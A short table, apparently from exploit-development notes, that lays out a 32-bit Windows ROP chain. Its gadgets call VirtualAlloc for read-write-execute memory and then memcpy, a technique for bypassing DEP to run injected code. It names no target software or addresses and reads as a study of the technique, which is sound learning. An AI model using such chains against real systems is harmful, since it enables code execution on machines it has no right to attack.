|Position   |Type (Gadget / Value) |Description   | Explenation |
| :---: | :---: | :---: | :---: |
| 12 | V  | junk | will ptr to alloced area
| 11 | G  |`mov [esp+4]`|  sets the value of line 12
| 10 | G  |`add esp, 24` | goes to line 5
| 9  | G  |`mov esi, eax`| saves alloc area ptr for later  
| 8  | G  |`push eax` | first arg of `memcpy`
| 7  | G  |`push edi` | second arg of `memcpy`
| 6  | G  |`sub esp, 16` | goes to line 11
| 5  | V  |addr of `memcpy`|
| 4  | V  |`PAGE_RWE`| third arg of `VirtualAlloc`
| 3  | V  |`MEM_COMMIT`| second arg of `VirtualAlloc`
| 2  | V  |`0x1000`| first arg of `VirtualAlloc`
| 1  | G  |`sub esp, 20`| goes to line 7
| 0  | V  |addr of `VirtualAlloc`   | `VirtualAlloc` is executed